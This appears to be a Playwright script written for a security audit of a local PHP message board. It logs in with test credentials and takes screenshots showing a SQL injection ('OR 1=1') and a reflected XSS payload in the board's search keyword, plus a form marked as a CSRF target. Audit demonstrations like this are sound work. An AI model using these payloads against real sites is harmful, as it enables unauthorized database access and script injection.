import { chromium } from 'playwright';
import { mkdir } from 'node:fs/promises';

const baseURL = 'http://localhost:8080';
const output = 'reports/demo';
await mkdir(output, { recursive: true });
const browser = await chromium.launch({
  headless: true,
  executablePath: process.env.PLAYWRIGHT_CHROME || undefined,
});
const page = await browser.newPage({ viewport: { width: 1280, height: 900 } });

await page.goto(`${baseURL}/member/member_login.php`, { waitUntil: 'networkidle' });
await page.locator('input[name="user_id"]').fill('test');
await page.locator('input[name="user_pw"]').fill('test1234');
await page.locator('input[type="submit"]').click();
await page.waitForURL(`${baseURL}/index.php`);
await page.screenshot({ path: `${output}/01-authenticated-session.png`, fullPage: true });

const sqli = new URLSearchParams({ k_s: '1', keyword: "__sqli_no_match__%' OR 1=1 -- " });
await page.goto(`${baseURL}/board/board_list.php?${sqli}`, { waitUntil: 'networkidle' });
await page.screenshot({ path: `${output}/02-sqli-search-result.png`, fullPage: true });

const xss = new URLSearchParams({ k_s: '1', keyword: '<svg/onload=alert("XSS_AUDIT")>' });
page.on('dialog', dialog => dialog.dismiss());
await page.goto(`${baseURL}/board/board_list.php?${xss}`, { waitUntil: 'networkidle' });
await page.screenshot({ path: `${output}/03-xss-reflection.png`, fullPage: true });

await page.goto(`${baseURL}/member/member_nick.php`, { waitUntil: 'networkidle' });
await page.screenshot({ path: `${output}/04-csrf-target-form.png`, fullPage: true });

await browser.close();
console.log(`Saved screenshots to ${output}`);
